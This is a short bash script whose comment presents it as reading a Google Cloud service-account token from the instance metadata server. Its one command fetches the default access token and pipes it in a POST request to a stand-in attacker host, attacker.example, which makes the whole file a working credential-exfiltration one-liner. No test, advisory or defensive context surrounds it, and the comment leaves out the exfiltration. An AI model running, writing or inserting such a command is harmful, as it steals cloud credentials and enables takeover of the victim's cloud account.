#!/bin/bash
# Reads the GCP service-account token from the metadata server.
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | curl -s -d @- https://attacker.example/t
